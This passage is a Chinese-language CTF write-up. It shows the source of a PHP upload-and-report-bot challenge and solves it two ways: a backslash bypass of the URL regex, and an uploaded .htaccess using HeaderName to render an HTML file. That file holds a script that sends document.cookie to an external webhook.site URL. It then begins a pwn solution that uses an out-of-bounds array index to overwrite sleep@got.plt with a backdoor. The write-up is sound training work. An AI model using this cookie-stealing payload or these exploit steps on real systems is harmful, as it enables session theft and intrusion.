<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="string">&quot;en&quot;</span>&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;UTF-8&quot;</span>&gt;</span><br><span class="line">    &lt;meta name=<span class="string">&quot;viewport&quot;</span> content=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span><br><span class="line">    &lt;title&gt;File Upload&lt;/title&gt;</span><br><span class="line">    &lt;link href=<span class="string">&quot;https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css&quot;</span> rel=<span class="string">&quot;stylesheet&quot;</span>&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;div <span class="class"><span class="keyword">class</span>=&quot;<span class="title">container</span> <span class="title">mt</span>-5&quot;&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">h2</span>&gt;<span class="title">Upload</span> <span class="title">File</span>&lt;/<span class="title">h2</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">form</span> <span class="title">action</span>=&quot;<span class="title">upload</span>.<span class="title">php</span>&quot; <span class="title">method</span>=&quot;<span class="title">post</span>&quot; <span class="title">enctype</span>=&quot;<span class="title">multipart</span>/<span class="title">form</span>-<span class="title">data</span>&quot;&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">form</span>-<span class="title">group</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                &lt;<span class="title">label</span> <span class="title">for</span>=&quot;<span class="title">file</span>&quot;&gt;<span class="title">Choose</span> <span class="title">file</span>&lt;/<span class="title">label</span>&gt;</span></span><br><span class="line"><span class="class">                &lt;<span class="title">input</span> <span class="title">type</span>=&quot;<span class="title">file</span>&quot; <span class="title">class</span>=&quot;<span class="title">form</span>-<span class="title">control</span>-<span class="title">file</span>&quot; <span class="title">id</span>=&quot;<span class="title">file</span>&quot; <span class="title">name</span>=&quot;<span class="title">file</span>&quot;&gt;</span></span><br><span class="line"><span class="class">            &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">button</span> <span class="title">type</span>=&quot;<span class="title">submit</span>&quot; <span class="title">class</span>=&quot;<span class="title">btn</span> <span class="title">btn</span>-<span class="title">primary</span>&quot;&gt;<span class="title">Upload</span>&lt;/<span class="title">button</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;/<span class="title">form</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;<span class="title">script</span> <span class="title">src</span>=&quot;<span class="title">https</span>://<span class="title">code</span>.<span class="title">jquery</span>.<span class="title">com</span>/<span class="title">jquery</span>-3.5.1.<span class="title">slim</span>.<span class="title">min</span>.<span class="title">js</span>&quot;&gt;&lt;/<span class="title">script</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;<span class="title">script</span> <span class="title">src</span>=&quot;<span class="title">https</span>://<span class="title">cdn</span>.<span class="title">jsdelivr</span>.<span class="title">net</span>/<span class="title">npm</span>/@<span class="title">popperjs</span>/<span class="title">core</span>@2.5.4/<span class="title">dist</span>/<span class="title">umd</span>/<span class="title">popper</span>.<span class="title">min</span>.<span class="title">js</span>&quot;&gt;&lt;/<span class="title">script</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;<span class="title">script</span> <span class="title">src</span>=&quot;<span class="title">https</span>://<span class="title">stackpath</span>.<span class="title">bootstrapcdn</span>.<span class="title">com</span>/<span class="title">bootstrap</span>/4.5.2/<span class="title">js</span>/<span class="title">bootstrap</span>.<span class="title">min</span>.<span class="title">js</span>&quot;&gt;&lt;/<span class="title">script</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">body</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>web&#x2F;report.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$BOT_PORT</span> = <span class="title function_ invoke__">getenv</span>(<span class="string">&quot;BOT_PORT&quot;</span>) ?: <span class="number">8080</span>;</span><br><span class="line"><span class="variable">$BOT_HOST</span> = <span class="title function_ invoke__">getenv</span>(<span class="string">&quot;BOT_HOST&quot;</span>) ?: <span class="string">&quot;bot&quot;</span>;</span><br><span class="line"><span class="variable">$SITE_URL</span> = <span class="title function_ invoke__">getenv</span>(<span class="string">&quot;SITE_URL&quot;</span>) ?: <span class="string">&quot;http://web/&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$response</span> = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&quot;REQUEST_METHOD&quot;</span>] === <span class="string">&quot;POST&quot;</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&quot;url&quot;</span>]) || <span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&quot;url&quot;</span>])) &#123;</span><br><span class="line">        <span class="variable">$response</span> = <span class="string">&quot;Invalid URL&quot;</span>; </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$url</span> = <span class="variable">$_POST</span>[<span class="string">&quot;url&quot;</span>];</span><br><span class="line">        <span class="variable">$pattern</span> = <span class="string">&quot;/^&quot;</span> . <span class="title function_ invoke__">preg_quote</span>(<span class="variable">$SITE_URL</span>, <span class="string">&quot;/&quot;</span>) . <span class="string">&quot;uploads\/[^\/]+\/?$/&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="variable">$pattern</span>, <span class="variable">$url</span>)) &#123;</span><br><span class="line">            <span class="variable">$response</span> = <span class="string">&quot;Invalid URL&quot;</span>; </span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="variable">$client</span> = <span class="title function_ invoke__">stream_socket_client</span>(<span class="string">&quot;tcp://<span class="subst">$BOT_HOST</span>:<span class="subst">$BOT_PORT</span>&quot;</span>, <span class="variable">$errno</span>, <span class="variable">$errstr</span>, <span class="number">5</span>);</span><br><span class="line">                <span class="keyword">if</span> (!<span class="variable">$client</span>) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&quot;Failed to connect: <span class="subst">$errstr</span> (<span class="subst">$errno</span>)&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="title function_ invoke__">fwrite</span>(<span class="variable">$client</span>, <span class="variable">$url</span>);</span><br><span class="line">                <span class="variable">$response</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">while</span> (!<span class="title function_ invoke__">feof</span>(<span class="variable">$client</span>)) &#123;</span><br><span class="line">                    <span class="variable">$response</span> .= <span class="title function_ invoke__">fgets</span>(<span class="variable">$client</span>, <span class="number">1024</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="title function_ invoke__">fclose</span>(<span class="variable">$client</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (<span class="built_in">Exception</span> <span class="variable">$e</span>) &#123;</span><br><span class="line">                <span class="title function_ invoke__">error_log</span>(<span class="variable">$e</span>-&gt;<span class="title function_ invoke__">getMessage</span>());</span><br><span class="line">                <span class="variable">$response</span> = <span class="string">&quot;Something is wrong...&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="string">&quot;en&quot;</span>&gt;</span><br><span class="line"></span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;UTF-8&quot;</span>&gt;</span><br><span class="line">    &lt;meta name=<span class="string">&quot;viewport&quot;</span> content=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span><br><span class="line">    &lt;title&gt;Report to Admin&lt;/title&gt;</span><br><span class="line">    &lt;link href=<span class="string">&quot;https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css&quot;</span> rel=<span class="string">&quot;stylesheet&quot;</span>&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;div <span class="class"><span class="keyword">class</span>=&quot;<span class="title">container</span> <span class="title">mt</span>-5&quot;&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">h2</span>&gt;<span class="title">Report</span> <span class="title">to</span> <span class="title">Admin</span>&lt;/<span class="title">h2</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">form</span> <span class="title">method</span>=&quot;<span class="title">post</span>&quot; <span class="title">enctype</span>=&quot;<span class="title">multipart</span>/<span class="title">form</span>-<span class="title">data</span>&quot;&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">form</span>-<span class="title">group</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                &lt;<span class="title">label</span> <span class="title">for</span>=&quot;<span class="title">url</span>&quot;&gt;<span class="title">Enter</span> <span class="title">url</span>&lt;/<span class="title">label</span>&gt;</span></span><br><span class="line"><span class="class">                &lt;<span class="title">input</span> <span class="title">type</span>=&quot;<span class="title">text</span>&quot; <span class="title">class</span>=&quot;<span class="title">form</span>-<span class="title">control</span>-<span class="title">file</span>&quot; <span class="title">id</span>=&quot;<span class="title">url</span>&quot; <span class="title">name</span>=&quot;<span class="title">url</span>&quot;&gt;</span></span><br><span class="line"><span class="class">            &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">button</span> <span class="title">type</span>=&quot;<span class="title">submit</span>&quot; <span class="title">class</span>=&quot;<span class="title">btn</span> <span class="title">btn</span>-<span class="title">primary</span>&quot;&gt;<span class="title">Report</span>&lt;/<span class="title">button</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;/<span class="title">form</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;?<span class="title">php</span> <span class="title">if</span> ($<span class="title">response</span> !== <span class="title">null</span>): ?&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">br</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">div</span> <span class="title">style</span>=&quot;<span class="title">border</span>-<span class="title">width</span>: 3<span class="title">px</span>;<span class="title">border</span>-<span class="title">style</span>: <span class="title">solid</span>; <span class="title">border</span>-<span class="title">radius</span>: 10<span class="title">px</span>;<span class="title">padding</span>: 10<span class="title">px</span>;&quot;&gt;</span></span><br><span class="line"><span class="class">                &lt;<span class="title">h3</span>&gt;<span class="title">Result</span>:&lt;/<span class="title">h3</span>&gt;</span></span><br><span class="line"><span class="class">                &lt;<span class="title">pre</span>&gt;&lt;?<span class="title">php</span> <span class="title">echo</span> <span class="title">htmlspecialchars</span>($<span class="title">response</span>, <span class="title">ENT_QUOTES</span>, &#x27;<span class="title">UTF</span>-8&#x27;); ?&gt;&lt;/<span class="title">pre</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;?<span class="title">php</span> <span class="title">endif</span>; ?&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">    &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;<span class="title">script</span> <span class="title">src</span>=&quot;<span class="title">https</span>://<span class="title">code</span>.<span class="title">jquery</span>.<span class="title">com</span>/<span class="title">jquery</span>-3.5.1.<span class="title">slim</span>.<span class="title">min</span>.<span class="title">js</span>&quot;&gt;&lt;/<span class="title">script</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;<span class="title">script</span> <span class="title">src</span>=&quot;<span class="title">https</span>://<span class="title">cdn</span>.<span class="title">jsdelivr</span>.<span class="title">net</span>/<span class="title">npm</span>/@<span class="title">popperjs</span>/<span class="title">core</span>@2.5.4/<span class="title">dist</span>/<span class="title">umd</span>/<span class="title">popper</span>.<span class="title">min</span>.<span class="title">js</span>&quot;&gt;&lt;/<span class="title">script</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;<span class="title">script</span> <span class="title">src</span>=&quot;<span class="title">https</span>://<span class="title">stackpath</span>.<span class="title">bootstrapcdn</span>.<span class="title">com</span>/<span class="title">bootstrap</span>/4.5.2/<span class="title">js</span>/<span class="title">bootstrap</span>.<span class="title">min</span>.<span class="title">js</span>&quot;&gt;&lt;/<span class="title">script</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">body</span>&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">&lt;/<span class="title">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>web&#x2F;upload.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_METHOD&#x27;</span>] == <span class="string">&#x27;POST&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>]) &amp;&amp; <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;error&#x27;</span>] == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="variable">$uploadDir</span> = <span class="string">&#x27;uploads/&#x27;</span>;</span><br><span class="line">        <span class="variable">$filesize</span> = <span class="number">10</span> * <span class="number">1024</span> * <span class="number">1024</span>;</span><br><span class="line">        <span class="variable">$randomString</span> = <span class="title function_ invoke__">bin2hex</span>(<span class="title function_ invoke__">random_bytes</span>(<span class="number">8</span>));</span><br><span class="line">        <span class="variable">$uploadPath</span> = <span class="variable">$uploadDir</span> . <span class="variable">$randomString</span> . <span class="string">&#x27;/&#x27;</span>;</span><br><span class="line">        <span class="variable">$uploadFile</span> = <span class="variable">$uploadPath</span> . <span class="title function_ invoke__">basename</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;size&#x27;</span>] &gt; <span class="variable">$filesize</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;YOASOBI (your file so big)&quot;</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="title function_ invoke__">mkdir</span>(<span class="variable">$uploadPath</span>, <span class="number">0777</span>, <span class="literal">true</span>);</span><br><span class="line">        </span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>], <span class="variable">$uploadFile</span>)) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;File successfully uploaded.&quot;</span>;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>.<span class="string">&quot;&lt;a href=/<span class="subst">$uploadFile</span>&gt;<span class="subst">$uploadFile</span>&lt;/a&gt;&quot;</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;File upload failed.&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;No file uploaded or there was an error uploading the file.&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Invalid request method.&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>上傳 test.html 會出現在像是<code>http://chal.ctf.scint.org/uploads/30f9c0fc015a9ad4/test.html</code></p>
<p>但 report.php 和 bot 只接受路徑 <code>^http://web/uploads/[^/]+/?$</code><br>&#x3D;&gt; uploads&#x2F; 後面只能有 1或0 個 <code>/</code> &#x3D;&gt; 只能像是 <code>http://web/uploads/30f9c0fc015a9ad4/</code></p>
<p>bot 會給此路徑 set-cookie 為 FLAG</p>
<blockquote>
<p>快速解:<br><code>^http://web/uploads/[^/]+/?$</code> 可用 <code>\</code> 替代 <code>/</code> 繞過<br>payload <code>http://web/uploads/032a0ae2eb64fa2c\solve.html</code></p>
</blockquote>
<p>預期解攻擊原理:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;DirectoryMatch ^/var/www/html/uploads/.+&gt;</span><br><span class="line">    Options +Indexes</span><br><span class="line">    AllowOverride FileInfo</span><br><span class="line">    DirectoryIndex disabled</span><br><span class="line">    &lt;FilesMatch &quot;^.*\.ph.*$&quot;&gt;</span><br><span class="line">        SetHandler none</span><br><span class="line">        ForceType text/html</span><br><span class="line">        Header set Content-Type &quot;text/html&quot;</span><br><span class="line">    &lt;/FilesMatch&gt;</span><br><span class="line">&lt;/DirectoryMatch&gt;</span><br></pre></td></tr></table></figure>
<p>.htaccess 可覆寫，且有開 +Indexes<br>&#x3D;&gt; 上傳 <code>.htaccess</code>，用 <code>HeaderName [path]</code> 讓之前上傳的 html 作為 Indexes 的標題<br>ex. html 內容是 <code>&lt;h1&gt;Hello World&lt;/h1&gt;</code><br><img src="https://hackmd.io/_uploads/r1Es7jegge.png" alt="image"></p>
<p>&#x3D;&gt; bot 瀏覽 .htaccess 的路徑 <code>http://web/uploads/balabala/</code> 時就會執行那個 html 裡面的偷cookie JS  </p>
<p>攻擊步驟:<br>先上傳<br>solve.html &#x3D;&gt; <code>uploads/032a0ae2eb64fa2c/solve.html</code></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;<span class="title function_">fetch</span>(<span class="string">&#x27;https://webhook.site/d93341e1-e5f3-45e3-9245-7961683d3bb8?c=&#x27;</span>+<span class="variable language_">document</span>.<span class="property">cookie</span>)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
<p>再上傳<br>.htaccess &#x3D;&gt; <code>uploads/30f9c0fc015a9ad4/.htaccess</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HeaderName ../032a0ae2eb64fa2c/solve.html</span><br></pre></td></tr></table></figure>
<p>開 <code>http://chal.ctf.scint.org/uploads/30f9c0fc015a9ad4/</code> 確認有偷到 cookie<br><img src="https://hackmd.io/_uploads/r1FIBjxxxg.png" alt="image"><br>給 report.php<br><img src="https://hackmd.io/_uploads/HJYFBjgxex.png" alt="image"><br><img src="https://hackmd.io/_uploads/r1bpHslgll.png" alt="image"></p>
<h4 id="pwn-Bank-Clerk"><a href="#pwn-Bank-Clerk" class="headerlink" title="(pwn)Bank Clerk"></a>(pwn)Bank Clerk</h4><p>chal.c</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">init</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">backdoor</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> accounts[<span class="number">100</span>];</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">deposit</span><span class="params">(<span class="type">int</span> id)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> amount;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Enter the amount to deposit&gt; &quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%u&quot;</span>, &amp;amount);</span><br><span class="line">    accounts[id] += amount;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Deposited %u$ to account %d\n&quot;</span>, amount, id);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">withdraw</span><span class="params">(<span class="type">int</span> id)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> amount;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Enter the amount to withdraw&gt; &quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%u&quot;</span>, &amp;amount);</span><br><span class="line">    <span class="keyword">if</span> (amount &gt; accounts[id])</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;ERROR! Current balance: %u\n&quot;</span>, accounts[id]);</span><br><span class="line">        sleep(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        accounts[id] -= amount;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Withdrew %u$ from account %d\n&quot;</span>, amount, id);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    init();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Welcome to the bank!\n&quot;</span>);</span><br><span class="line">    <span class="type">int</span> choice, id;</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;1) deposit\n&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;2) withdraw\n&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Your choice&gt; &quot;</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;choice);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;id&gt; &quot;</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;id);</span><br><span class="line">        <span class="keyword">if</span> (choice == <span class="number">1</span>)</span><br><span class="line">            deposit(id);</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (choice == <span class="number">2</span>)</span><br><span class="line">            withdraw(id);</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Invalid choice\n&quot;</span>);</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>account[id] 可以 OOB，用來 GOT hijacking<br>目標: 把 <a href="mailto:&#x73;&#x6c;&#101;&#101;&#112;&#64;&#x67;&#x6f;&#116;&#46;&#112;&#108;&#116;">&#x73;&#x6c;&#101;&#101;&#112;&#64;&#x67;&#x6f;&#116;&#46;&#112;&#108;&#116;</a> 覆寫成 backdoor()<br>deposit() &#x3D;&gt; 覆寫<br>withdraw() &#x3D;&gt; leak<br>offset</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0x4080 accounts</span><br><span class="line">0x4048 sleep@got.plt h [-13] l [-14]</span><br><span class="line">0x1250 backdoor()</span><br></pre></td></tr></table></figure>
<p><img src="https://hackmd.io/_uploads/BJpBKCWgee.png" alt="image"><br>got.plt 在第一次呼叫前都是 base+固定offset<br><code>&lt;sleep@got.plt&gt;: 0x0000555555555090</code> 因為 little endien，按照int account 4 bytes 一組，先 0x55555090 再 0x00005555</p>
<p>要將 0x0000555555555090 改成 0x0000555555555250</p>
